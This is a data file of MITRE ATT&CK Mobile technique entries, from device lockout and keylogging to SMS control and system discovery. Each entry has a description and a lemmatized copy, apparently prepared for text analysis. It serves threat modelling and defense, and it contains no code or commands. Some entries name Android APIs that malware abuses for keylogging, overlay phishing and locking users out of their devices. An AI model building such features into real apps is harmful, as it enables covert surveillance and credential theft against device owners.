T1629.002,Impair Defenses: Device Lockout,"An adversary may seek to inhibit user interaction by locking the legitimate user out of the device. This is typically accomplished by requesting device administrator permissions and then locking the screen using DevicePolicyManager.lockNow(). Other novel techniques for locking the user out of the device have been observed, such as showing a persistent overlay, using carefully crafted ""call"" notification screens, and locking HTML pages in the foreground. These techniques can be very difficult to get around, and typically require booting the device into safe mode to uninstall the malware.Prior to Android 7, device administrators were able to reset the device lock passcode to prevent the user from unlocking the device. The release of Android 7 introduced updates that only allow device or profile owners (e.g. MDMs) to reset the device’s passcode.",adversary seek inhibit user interaction lock legitimate user device typically accomplish request device administrator permission lock screen novel technique lock user device observe show persistent overlay carefully craft notification screen lock html page foreground technique difficult typically require boot device safe mode uninstall malware prior android device administrator able reset device lock passcode prevent user unlock device release android introduce update allow device profile owner mdm reset device passcode
T1629.003,Impair Defenses: Disable or Modify Tools,"Adversaries may disable security tools to avoid potential detection of their tools and activities. This can take the form of disabling security software, modifying SELinux configuration, or other methods to interfere with security tools scanning or reporting information. This is typically done by abusing device administrator permissions or using system exploits to gain root access to the device to modify protected system files.",adversary disable security tool avoid potential detection tool activity form disable security software modify selinux configuration method interfere security tool scan report information typically abuse device administrator permission system exploit gain root access device modify protect system file
T1630,Indicator Removal on Host,"Adversaries may delete, alter, or hide generated artifacts on a device, including files, jailbreak status, or the malicious application itself. These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of mobile security solutions by causing notable events or information to go unreported.",adversary delete alter hide generate artifact device include file jailbreak status malicious application action interfere event collection reporting notification detect intrusion activity compromise integrity mobile security solution cause notable event information unreported
T1630.001,Indicator Removal on Host: Uninstall Malicious Application,"Adversaries may include functionality in malware that uninstalls the malicious application from the device. This can be achieved by: Abusing device owner permissions to perform silent uninstallation using device owner API calls. Abusing root permissions to delete files from the filesystem. Abusing the accessibility service. This requires sending an intent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.",adversary include functionality malware uninstall malicious application device achieve abuse device owner permission perform silent uninstallation device owner api call abuse root permission delete file filesystem abuse accessibility service require send intent system request uninstallation abuse accessibility service click proper place screen confirm uninstallation
T1630.002,Indicator Removal on Host: File Deletion,"Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location. Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.",adversary wipe device delete individual file order manipulate external outcome hide activity application administrator access fully wipe device individual file require special permission delete depend storage location store datum include variety file format office file database store email custom file format impact file deletion depend type datum goal objective adversary include delete update file evade detection delete attacker specify file impact
T1630.003,Indicator Removal on Host: Disguise Root/Jailbreak Indicators,An adversary could use knowledge of the techniques used by security software to evade detection.,adversary use knowledge technique security software evade detection
T1544,Ingress Tool Transfer,Adversaries may transfer tools or other files from an external system onto a compromised device to facilitate follow-on actions. Files may be copied from an external adversary-controlled system through the command and control channel or through alternate protocols with another tool such as FTP.,adversary transfer tool file external system compromised device facilitate follow action file copy external adversary control system command control channel alternate protocol tool ftp
T1417,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal device usage, users often provide credentials to various locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Keylogging) or rely on deceiving the user into providing input into what they believe to be a genuine application prompt (e.g. GUI Input Capture).",adversary use method capture user input obtain credential collect information normal device usage user provide credential location login page portal system dialog box input capture mechanism transparent user keylogging rely deceive user provide input believe genuine application prompt gui input capture
T1417.001,Input Capture: Keylogging,"Adversaries may log user keystrokes to intercept credentials or other information from the user as the user types them.Some methods of keylogging include:Masquerading as a legitimate third-party keyboard to record user keystrokes. On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested. Abusing accessibility features. On Android, adversaries may abuse accessibility features to record keystrokes by registering an AccessibilityService class, overriding the onAccessibilityEvent method, and listening for the AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED event type. The event object passed into the function will contain the data that the user typed. *Additional methods of keylogging may be possible if root access is available.",adversary log user keystroke intercept credential information user user type method keylogging include masquerade legitimate party keyboard record user keystroke android ios user explicitly authorize use party keyboard app user advise use extreme caution grant authorization request abuse accessibility feature android adversary abuse accessibility feature record keystroke register accessibilityservice class override onaccessibilityevent method listen accessibilityevent event type event object pass function contain datum user type additional method keylogging possible root access available
T1417.002,Input Capture: GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for sensitive information with a seemingly legitimate prompt. The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.There are several approaches adversaries may use to mimic this functionality. Adversaries may impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and, when installed on the device, may prompt the user for sensitive information. Additionally, adversaries may display a prompt on top of a running, legitimate application to trick users into entering sensitive information into a malicious application rather than the legitimate application. Typically, adversaries need to know when the targeted application and the individual activity within the targeted application is running in the foreground to display the prompt at the proper time. Adversaries can abuse Android’s accessibility features to determine which application is currently in the foreground. Two known approaches to displaying a prompt include:Adversaries start a new activity on top of a running legitimate application. Adversaries create an application overlay window on top of a running legitimate application. Applications must hold the SYSTEM_ALERT_WINDOW permission to create overlay windows. This permission is handled differently than typical Android permissions and, at least under certain conditions, is automatically granted to applications installed from the Google Play Store.",adversary mimic common operate system gui component prompt user sensitive information seemingly legitimate prompt operate system instal application legitimate need prompt user sensitive information account credential bank account information personally identifiable information pii compare traditional pc constrained display size mobile device impair ability provide user contextual information make user susceptible technique use approach adversary use mimic functionality adversary impersonate identity legitimate application use application icon instal device prompt user sensitive information additionally adversary display prompt run legitimate application trick user enter sensitive information malicious application legitimate application typically adversary need know target application individual activity target application run foreground display prompt proper time adversary abuse android accessibility feature determine application currently foreground know approach display prompt include adversary start new activity run legitimate application adversary create application overlay window run legitimate application application hold permission create overlay window permission handle differently typical android permission certain condition automatically grant application instal google play store
T1516,Input Injection,"A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.Input Injection can be achieved using any of the following methods:Mimicking user clicks on the screen, for example to steal money from a user's PayPal account. Injecting global actions, such as GLOBAL_ACTION_BACK (programatically mimicking a physical back button press), to trigger actions on behalf of the user. Inserting input into text fields on behalf of the user. This method is used legitimately to auto-fill text fields by applications such as password managers.",malicious application inject input user interface mimic user interaction abuse android accessibility api input injection achieve following method mimic user click screen example steal money user paypal account inject global action programatically mimic physical button press trigger action behalf user insert input text field behalf user method legitimately auto fill text field application password manager
T1430,Location Tracking,"Adversaries may track a device’s physical location through use of standard operating system APIs via malicious or exploited applications on the compromised device. On Android, applications holding the ACCESS_COAURSE_LOCATION or ACCESS_FINE_LOCATION permissions provide access to the device’s physical location. On Android 10 and up, declaration of the ACCESS_BACKGROUND_LOCATION permission in an application’s manifest will allow applications to request location access even when the application is running in the background. On iOS, applications must include the NSLocationWhenInUseUsageDescription, NSLocationAlwaysAndWhenInUseUsageDescription, and/or NSLocationAlwaysUsageDescription keys in their Info.plist file depending on the extent of requested access to location information.",adversary track device physical location use standard operating system api malicious exploit application compromised device android application hold permission provide access device physical location android declaration permission application manifest allow application request location access application run background ios application include nslocationwheninuseusagedescription nslocationalwaysandwheninuseusagedescription nslocationalwaysusagedescription key file depend extent request access location information
T1430.001,Location Tracking: Remote Device Management Services,An adversary may use access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM)/mobile device management (MDM) server console to track the location of mobile devices managed by the service.,adversary use access cloud service google android device manager apple icloud find iphone enterprise mobility management device management mdm server console track location mobile device manage service
T1430.002,Location Tracking: Impersonate SS7 Nodes,"Adversaries may exploit the lack of authentication in signaling system network nodes to track the to track the location of mobile devices by impersonating a node. By providing the victim’s MSISDN (phone number) and impersonating network internal nodes to query subscriber information from other nodes, adversaries may use data collected from each hop to eventually determine the device’s geographical cell area or nearest cell tower.",adversary exploit lack authentication signal system network node track track location mobile device impersonate node provide victim msisdn phone number impersonate network internal node query subscriber information node adversary use datum collect hop eventually determine device geographical cell area near cell tower
T1461,Lockscreen Bypass,"An adversary with physical access to a mobile device may seek to bypass the device’s lockscreen. Several methods exist to accomplish this, including:Biometric spoofing: If biometric authentication is used, an adversary could attempt to spoof a mobile device’s biometric authentication mechanism. Both iOS and Android partly mitigate this attack by requiring the device’s passcode rather than biometrics to unlock the device after every device restart, and after a set or random amount of time. Unlock code bypass: An adversaries could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (""shoulder surfing"") the device owner’s use of the lockscreen passcode. Mobile OS vendors partly mitigate this by implementing incremental backoff timers after a set number of failed unlock attempts, as well as a configurable full device wipe after several failed unlock attempts. Vulnerability exploit: Techniques have been periodically demonstrated that exploit mobile devices to bypass the lockscreen. The vulnerabilities are generally patched by the device or OS vendor once disclosed.",adversary physical access mobile device seek bypass device lockscreen method exist accomplish include biometric spoofing biometric authentication adversary attempt spoof mobile device biometric authentication mechanism ios android partly mitigate attack require device passcode biometric unlock device device restart set random time unlock code bypass adversary attempt brute force guess lockscreen passcode typically pin password include physically observe shoulder surf device owner use lockscreen passcode mobile os vendor partly mitigate implement incremental backoff timer set number fail unlock attempt configurable device wipe fail unlock attempt vulnerability exploit technique periodically demonstrate exploit mobile device bypass lockscreen vulnerability generally patch device os vendor disclose
T1575,Native API,"Adversaries may use Android’s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.The NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.Adversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.",adversary use android native development kit ndk write native function achieve execution binary function like system call traditional desktop operate system native code achieve execution low level normal android sdk call ndk allow developer write native code c compile directly machine code avoid intermediate language step compilation high level language like java typically java native interface jni component allow java function android app function native library adversary choose use native function execute malicious code native action typically difficult analyze standard non native behavior
T1464,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth that services rely on, or by jamming the signal going to or coming from devices. A Network DoS will occur when an adversary is able to jam radio signals (e.g. Wi-Fi, cellular, GPS) around a device to prevent it from communicating. For example, to jam cellular signal, an adversary may use a handheld signal jammer, which jam devices within the jammer’s operational range. Usage of cellular jamming has been documented in several arrests reported in the news.",adversary perform network denial service dos attack degrade block availability target resource user network dos perform exhaust network bandwidth service rely jam signal go come device network dos occur adversary able jam radio signal wi fi cellular gps device prevent communicate example jam cellular signal adversary use handheld signal jammer jam device jammer operational range usage cellular jamming document arrest report news
T1423,Network Service Scanning,"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).",adversary attempt listing service run remote host include vulnerable remote software exploitation method acquire information include port scan vulnerability scan mobile device technique advantage mobile device access internal enterprise network local connectivity virtual private network vpn
T1509,Non-Standard Port,"Adversaries may generate network traffic using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",adversary generate network traffic protocol port paring typically associate example https port port oppose traditional port adversary change standard port protocol bypass filtering muddle analysis parsing network datum
T1406,Obfuscated Files or Information,"Adversaries may attempt to make a payload or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the device or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Portions of files can also be encoded to hide the plaintext strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.",adversary attempt payload file difficult discover analyze encrypt encode obfuscate content device transit common behavior different platform network evade defense payload compress archive encrypt order avoid detection payload initial access later mitigate detection portion file encode hide plaintext string help defender discovery payload split separate seemingly benign file reveal malicious functionality reassemble
T1406.001,Obfuscated Files or Information: Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.",adversary use steganography technique order prevent detection hidden information steganographic technique hide datum digital medium image audio track video clip text file
T1406.002,Obfuscated Files or Information: Software Packing,"Adversaries may perform software packing to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Utilities used to perform software packing are called packers. An example packer is FTT. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",adversary perform software packing conceal code software packing method compress encrypt executable pack executable change file signature attempt avoid signature base detection decompression technique decompress executable code memory utility perform software packing call packer example packer ftt comprehensive list know packer available adversary create packing technique leave artifact know packer evade defense
T1644,Out of Band Data,"Adversaries may communicate with compromised devices using out of band data streams. This could be done for a variety of reasons, including evading network traffic monitoring, as a backup method of command and control, or for data exfiltration if the device is not connected to any Internet-providing networks (i.e. cellular or Wi-Fi). Several out of band data streams exist, such as SMS messages, NFC, and Bluetooth. On Android, applications can read push notifications to capture content from SMS messages, or other out of band data streams. This requires that the user manually grant notification access to the application via the settings menu. However, the application could launch an Intent to take the user directly there. On iOS, there is no way to programmatically read push notifications.",adversary communicate compromised device band datum stream variety reason include evade network traffic monitoring backup method command control data exfiltration device connect internet provide network cellular wi fi band datum stream exist sms message nfc bluetooth android application read push notification capture content sms message band datum stream require user manually grant notification access application setting menu application launch intent user directly ios way programmatically read push notification
T1424,Process Discovery,"Adversaries may attempt to get information about running processes on a device. Information obtained could be used to gain an understanding of common software/applications running on devices within a network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Recent Android security enhancements have made it more difficult to obtain a list of running processes. On Android 7 and later, there is no way for an application to obtain the process list without abusing elevated privileges. This is due to the Android kernel utilizing the hidepid mount feature. Prior to Android 7, applications could utilize the ps command or examine the /proc directory on the device. In iOS, applications have previously been able to use the sysctl command to obtain a list of running processes. This functionality has been removed in later iOS versions.",adversary attempt information run process device information obtain gain understanding common software application run device network adversary use information process discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action recent android security enhancement difficult obtain list run process android later way application obtain process list abuse elevated privilege android kernel utilize hidepid mount feature prior android application utilize ps command examine directory device ios application previously able use sysctl command obtain list run process functionality remove later ios version
T1631,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses or even elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. Both Android and iOS have no legitimate way to achieve process injection. The only way this is possible is by abusing existing root access or exploiting a vulnerability.",adversary inject code process order evade process base defense elevate privilege process injection method execute arbitrary code address space separate live process run code context process allow access process memory system network resource possibly elevated privilege execution process injection evade detection security product execution mask legitimate process android ios legitimate way achieve process injection way possible abuse exist root access exploit vulnerability
T1631.001,Process Injection: Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection may not be possible when targeting processes with high-privileges, and on some systems those that are non-child processes. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process ptrace process trace system call order evade process base defense possibly elevate privilege ptrace system injection method execute arbitrary code address space separate live process ptrace system injection involve attach modify run process ptrace system enable debug process observe control process individual thread include change memory register value ptrace system injection possible target process high privilege system non child process run code context process allow access process memory system network resource possibly elevated privilege execution ptrace system injection evade detection security product execution mask legitimate process
T1636,Protected User Data,"Adversaries may utilize standard operating system APIs to collect data from permission-backed data stores on a device, such as the calendar or contact list. These permissions need to be declared ahead of time. On Android, they must be included in the application’s manifest. On iOS, they must be included in the application’s Info.plist file. In almost all cases, the user is required to grant access to the data store that the application is trying to access. In recent OS versions, vendors have introduced additional privacy controls for users, such as the ability to grant permission to an application only while the application is being actively used by the user. If the device has been jailbroken or rooted, an adversary may be able to access Protected User Data without the user’s knowledge or approval.",adversary utilize standard operating system api collect datum permission back data store device calendar contact list permission need declare ahead time android include application manifest ios include application file case user require grant access datum store application try access recent os version vendor introduce additional privacy control user ability grant permission application application actively user device jailbroken root adversary able access protected user data user knowledge approval
T1636.001,Protected User Data: Calendar Entries,"Adversaries may utilize standard operating system APIs to gather calendar entry data. On Android, this can be accomplished using the Calendar Content Provider. On iOS, this can be accomplished using the EventKit framework. If the device has been jailbroken or rooted, an adversary may be able to access Calendar Entries without the user’s knowledge or approval.",adversary utilize standard operating system api gather calendar entry datum android accomplish calendar content provider ios accomplish eventkit framework device jailbroken root adversary able access calendar entries user knowledge approval
T1636.002,Protected User Data: Call Log,"Adversaries may utilize standard operating system APIs to gather call log data. On Android, this can be accomplished using the Call Log Content Provider. iOS provides no standard API to access the call log. If the device has been jailbroken or rooted, an adversary may be able to access the Call Log without the user’s knowledge or approval.",adversary utilize standard operate system api gather log datum android accomplish log content provider ios provide standard api access log device jailbroken root adversary able access log user knowledge approval
T1636.003,Protected User Data: Contact List,"Adversaries may utilize standard operating system APIs to gather contact list data. On Android, this can be accomplished using the Contacts Content Provider. On iOS, this can be accomplished using the Contacts framework. If the device has been jailbroken or rooted, an adversary may be able to access the Contact List without the user’s knowledge or approval.",adversary utilize standard operating system api gather contact list datum android accomplish contacts content provider ios accomplish contacts framework device jailbroken root adversary able access contact list user knowledge approval
T1636.004,Protected User Data: SMS Messages,"Adversaries may utilize standard operating system APIs to gather SMS messages. On Android, this can be accomplished using the SMS Content Provider. iOS provides no standard API to access SMS messages. If the device has been jailbroken or rooted, an adversary may be able to access SMS Messages without the user’s knowledge or approval.",adversary utilize standard operating system api gather sms message android accomplish sms content provider ios provide standard api access sms message device jailbroken root adversary able access sms messages user knowledge approval
T1604,Proxy Through Victim,"Adversaries may use a compromised device as a proxy server to the Internet. By utilizing a proxy, adversaries hide the true IP address of their C2 server and associated infrastructure from the destination of the network traffic. This masquerades an adversary’s traffic as legitimate traffic originating from the compromised device, which can evade IP-based restrictions and alerts on certain services, such as bank accounts and social media websites.The most common type of proxy is a SOCKS proxy. It can typically be implemented using standard OS-level APIs and 3rd party libraries with no indication to the user. On Android, adversaries can use the Proxy API to programmatically establish a SOCKS proxy connection, or lower-level APIs to interact directly with raw sockets.",adversary use compromise device proxy server internet utilize proxy adversary hide true ip address server associate infrastructure destination network traffic masquerade adversary traffic legitimate traffic originate compromise device evade ip base restriction alert certain service bank account social medium website common type proxy socks proxy typically implement standard os level api party library indication user android adversary use proxy api programmatically establish socks proxy connection low level api interact directly raw socket
T1458,Replication Through Removable Media,"Adversaries may move onto devices by exploiting or copying malware to devices connected via USB. In the case of Lateral Movement, adversaries may utilize the physical connection of a device to a compromised or malicious charging station or PC to bypass application store requirements and install malicious applications directly. Examples of this include: Exploiting insecure bootloaders in a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location. Exploiting weakly-enforced security boundaries in Android devices such as the Google Pixel 2 over USB. Products from Cellebrite and Grayshift purportedly that can exploit some iOS devices using physical access to the data port to unlock the passcode.",adversary device exploit copy malware device connect usb case lateral movement adversary utilize physical connection device compromised malicious charging station pc bypass application store requirement install malicious application directly example include exploit insecure bootloader nexus device usb gain ability perform action include intercept phone call intercept network traffic obtain device physical location exploit weakly enforce security boundary android device google pixel usb product cellebrite grayshift purportedly exploit ios device physical access data port unlock passcode
T1603,Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. On Android and iOS, APIs and libraries exist to facilitate scheduling tasks to execute at a specified date, time, or interval.On Android, the WorkManager API allows asynchronous tasks to be scheduled with the system. WorkManager was introduced to unify task scheduling on Android, using JobScheduler, GcmNetworkManager, and AlarmManager internally. WorkManager offers a lot of flexibility for scheduling, including periodically, one time, or constraint-based (e.g. only when the device is charging).On iOS, the NSBackgroundActivityScheduler API allows asynchronous tasks to be scheduled with the system. The tasks can be scheduled to be repeating or non-repeating, however, the system chooses when the tasks will be executed. The app can choose the interval for repeating tasks, or the delay between scheduling and execution for one-time tasks.",adversary abuse task scheduling functionality facilitate initial recurring execution malicious code android ios api library exist facilitate schedule task execute specified date time interval android workmanager api allow asynchronous task schedule system workmanager introduce unify task scheduling android jobscheduler gcmnetworkmanager alarmmanager internally workmanager offer lot flexibility scheduling include periodically time constraint base device ios nsbackgroundactivityscheduler api allow asynchronous task schedule system task schedule repeat non repeating system choose task execute app choose interval repeat task delay scheduling execution time task
T1513,Screen Capture,"Adversaries may use screen capture to collect additional information about a target device, such as applications running in the foreground, user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android MediaProjectionManager (generally requires the device user to grant consent).",adversary use screen capture collect additional information target device application run foreground user datum credential sensitive information application run background capture screenshot video application run foreground android mediaprojectionmanager generally require device user grant consent
T1582,SMS Control,"Adversaries may delete, alter, or send SMS messages without user authorization. This could be used to hide C2 SMS messages, spread malware, or various external effects.This can be accomplished by requesting the RECEIVE_SMS or SEND_SMS permissions depending on what the malware is attempting to do. If the app is set as the default SMS handler on the device, the SMS_DELIVER broadcast intent can be registered, which allows the app to write to the SMS content provider. The content provider directly modifies the messaging database on the device, which could allow malicious applications with this ability to insert, modify, or delete arbitrary messages on the device.",adversary delete alter send sms message user authorization hide sms message spread malware external effect accomplish request permission depend malware attempt app set default sms handler device broadcast intent register allow app write sms content provider content provider directly modify messaging database device allow malicious application ability insert modify delete arbitrary message device
T1418,Software Discovery,"Adversaries may attempt to get a listing of applications that are installed on a device. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempts specific actions. Adversaries may attempt to enumerate applications for a variety of reasons, such as figuring out what security measures are present or to identify the presence of target applications.",adversary attempt listing application instal device adversary use information software discovery automate discovery shape follow behavior include fully infect target attempt specific action adversary attempt enumerate application variety reason figure security measure present identify presence target application
T1418.001,Software Discovery: Security Software Discovery,"Adversaries may attempt to get a listing of security applications and configurations that are installed on a device. This may include things such as mobile security products. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions.",adversary attempt listing security application configuration instal device include thing mobile security product adversary use information security software discovery automate discovery shape follow behavior include fully infect target attempt specific action
T1635,Steal Application Access Token,"Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering or URI hijacking and typically requires user action to grant access, such as through a system ""Open With"" dialogue. Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested without requiring user credentials.",adversary steal user application access token means acquire credential access remote system resource occur social engineering uri hijacking typically require user action grant access system open dialogue application access token authorized api request behalf user commonly way access resource cloud base application software service saas oauth access token enable party application interact resource contain user datum way request require user credential
T1635.001,Steal Application Access Token: URI Hijacking,"Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data. Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on. This allows redirections to that specific URI to be intercepted by the application. If an adversary were to register for a URI that was already in use by a genuine application, the adversary may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application. Intercepted data may include OAuth authorization codes or tokens that could be used by the adversary to gain access to protected resources.",adversary register uniform resource identifiers uris intercept sensitive datum application regularly register uri operate system act response handler action log app external account single sign allow redirection specific uri intercept application adversary register uri use genuine application adversary able intercept datum intend genuine application perform phishing attack genuine application intercepted datum include oauth authorization code token adversary gain access protect resource
T1409,Stored Application Data,"Adversaries may try to access and collect application data resident on the device. Adversaries often target popular applications, such as Facebook, WeChat, and Gmail. Due to mobile OS sandboxing, this technique is only possible in three scenarios: An application stores files in unprotected external storage An application stores files in its internal storage directory with insecure permissions (e.g. 777) The adversary gains root permissions on the device",adversary try access collect application datum resident device adversary target popular application facebook wechat gmail mobile os sandboxing technique possible scenario application store file unprotected external storage application store file internal storage directory insecure permission adversary gain root permission device
T1632,Subvert Trust Controls,Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted applications. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features include: an app being allowed to run because it is signed by a valid code signing certificate; an OS prompt alerting the user that an app came from an untrusted source; or getting an indication that you are about to connect to an untrusted site. The method adversaries use will depend on the specific mechanism they seek to subvert.,adversary undermine security control warn user untrusted activity prevent execution untrusted application operate system security product contain mechanism identify program website possess level trust example feature include app allow run sign valid code signing certificate os prompt alert user app come untrusted source get indication connect untrusted site method adversary use depend specific mechanism seek subvert
T1632.001,Subvert Trust Controls: Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of applications signed with unofficial or unknown keys. Code signing provides a level of authenticity on an app from a developer, guaranteeing that the program has not been tampered with and comes from an official source. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on a device. Mobile devices generally enable these security controls by default, such as preventing the installation of unknown applications on Android. Adversaries may modify these policies in a number of ways, including Input Injection or malicious configuration profiles.",adversary modify code signing policy enable execution application sign unofficial unknown key code signing provide level authenticity app developer guarantee program tamper come official source security control include enforcement mechanism ensure valid sign code run device mobile device generally enable security control default prevent installation unknown application android adversary modify policy number way include input injection malicious configuration profile
T1474,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development tools Manipulation of a development environment Manipulation of source code repositories (public or private) Manipulation of source code in open-source dependencies Manipulation of software update/distribution mechanisms Compromised/infected system images Replacement of legitimate software with modified versions Sales of modified/counterfeit products to legitimate distributors Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency, specifically with the widespread usage of third-party advertising libraries.",adversary manipulate product product delivery mechanism prior receipt final consumer purpose data system compromise supply chain compromise place stage supply chain include manipulation development tool manipulation development environment manipulation source code repository public private manipulation source code open source dependency manipulation software update distribution mechanism compromise infected system image replacement legitimate software modify version sale modify counterfeit product legitimate distributor shipment interdictionwhile supply chain compromise impact component hardware software attacker look gain execution focus malicious addition legitimate software software distribution update channel targeting specific desire victim set malicious software distribute broad set consumer additional tactic specific victim popular open source project dependency application target means add malicious code user dependency specifically widespread usage party advertising library
T1474.001,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.,adversary manipulate product product delivery mechanism prior receipt final consumer purpose datum system compromise application depend external software function properly popular open source project dependency application target means add malicious code user dependency
T1474.002,Supply Chain Compromise: Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system.",adversary manipulate hardware component product prior receipt final consumer purpose datum system compromise modify hardware firmware supply chain adversary insert backdoor consumer network difficult detect adversary high degree control system
T1474.003,Supply Chain Compromise: Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.",adversary manipulate application software prior receipt final consumer purpose datum system compromise supply chain compromise software place number way include manipulation application source code manipulation update distribution mechanism software replace compile release modify version
T1426,System Information Discovery,"Adversaries may attempt to get detailed information about a device’s operating system and hardware, including versions, patches, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not to fully infects the target and/or attempts specific actions. On Android, much of this information is programmatically accessible to applications through the android.os.Build class. iOS is much more restrictive with what information is visible to applications. Typically, applications will only be able to query the device model and which version of iOS it is running.",adversary attempt detailed information device operate system hardware include version patch architecture adversary use information system information discovery automate discovery shape follow behavior include fully infect target attempt specific action android information programmatically accessible application build class ios restrictive information visible application typically application able query device model version ios run
T1422,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of operating systems they access or through information discovery of remote systems. On Android, details of onboard network interfaces are accessible to apps through the java.net.NetworkInterface class. On iOS, gathering network configuration information is not possible without root access. Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",adversary look detail network configuration setting ip mac address operate system access information discovery remote system android detail onboard network interface accessible app networkinterface class ios gather network configuration information possible root access adversary use information system network configuration discovery automate discovery shape follow behavior include determine certain access target network action
